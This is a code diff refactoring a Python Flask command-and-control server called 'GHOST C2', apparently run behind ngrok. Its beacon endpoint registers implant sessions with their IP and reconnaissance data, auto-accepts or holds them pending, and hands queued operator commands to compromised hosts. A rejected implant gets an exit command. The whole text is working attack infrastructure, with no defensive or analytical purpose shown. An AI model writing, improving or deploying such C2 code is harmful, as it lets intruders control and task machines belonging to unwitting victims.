@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 GHOST C2 Server — direct Python / ngrok backend
-Replaces the Cloudflare Worker entirely.
+Direct Python/ngrok backend — no Cloudflare Worker needed.
 
 Usage:
   python c2_server.py [options]
@@ -85,9 +85,6 @@ def _cors(r: Response) -> Response:
     r.headers["Access-Control-Allow-Headers"] = "Content-Type,X-Beacon-Token,X-Operator-Token"
     return r
 
-def _ok(data: Any, status: int = 200) -> Response:
-    return _cors(jsonify(data) if not isinstance(data, Response) else data)
-
 def _err(msg: str, status: int) -> Response:
     r = jsonify({"error": msg})
     r.status_code = status
@@ -127,7 +124,9 @@ def preflight(p=""):
 # ── Health ────────────────────────────────────────────────────────────────────
 @app.route("/health", methods=["GET"])
 def health():
-    return _json_r({"status": "ok", "ts": _now(), "sessions": len(_sessions)})
+    with _lock:
+        count = len(_sessions)
+    return _json_r({"status": "ok", "ts": _now(), "sessions": count})
 
 # ── Beacon ────────────────────────────────────────────────────────────────────
 @app.route("/beacon", methods=["POST"])
@@ -141,14 +140,14 @@ def beacon():
     ip = _client_ip()
     ts = _now()
 
+    cmd_out = "sleep"
+    audit_action = "beacon"
+    audit_detail: dict = {"sid": sid}
+
     with _lock:
         existing = _sessions.get(sid)
-        if existing:
-            status = existing["status"]
-        else:
-            status = "accepted" if _CFG["auto_accept"] else "pending"
-
-        recon = body.get("recon", existing["recon"] if existing else {}) if isinstance(body.get("recon"), dict) else {}
+        status   = existing["status"] if existing else ("accepted" if _CFG["auto_accept"] else "pending")
+        recon    = body.get("recon") if isinstance(body.get("recon"), dict) else (existing["recon"] if existing else {})
 
         _sessions[sid] = {
             "session":       sid,
@@ -162,22 +161,18 @@ def beacon():
         }
 
         if status == "rejected":
-            _audit_log("beacon_rejected", {"sid": sid})
-            return _json_r({"cmd": "exit"})
+            cmd_out      = "exit"
+            audit_action = "beacon_rejected"
+        elif status == "pending":
+            audit_detail["status"] = "pending"
+        else:
+            q = _tasks.get(sid)
+            if q:
+                cmd_out = q.popleft()
+                _sessions[sid]["pending_tasks"] = len(q)
 
-        if status == "pending":
-            _audit_log("beacon", {"sid": sid, "status": "pending"})
-            return _json_r({"cmd": "sleep"})
-
-        q = _tasks.get(sid)
-        if q:
-            cmd = q.popleft()
-            _sessions[sid]["pending_tasks"] = len(q)
-            _audit_log("beacon", {"sid": sid})
-            return _json_r({"cmd": cmd})
-
-    _audit_log("beacon", {"sid": sid})
-    return _json_r({"cmd": "sleep"})
+    _audit_log(audit_action, audit_detail)
+    return _json_r({"cmd": cmd_out})
 
 # ── Result ────────────────────────────────────────────────────────────────────
 @app.route("/result", methods=["POST"])
